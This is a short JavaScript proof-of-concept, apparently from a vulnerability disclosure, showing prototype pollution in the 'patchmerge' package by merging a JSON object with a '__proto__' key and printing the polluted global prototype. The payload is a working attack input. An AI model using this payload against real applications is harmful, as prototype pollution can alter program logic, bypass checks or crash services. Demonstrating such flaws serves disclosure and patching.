var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
var patchMerge = require('patchmerge');
var obj = {};
console.log({}.polluted);
patchMerge(obj, JSON.parse('{"__proto__": { "polluted": "yes" }}'));
console.log({}.polluted);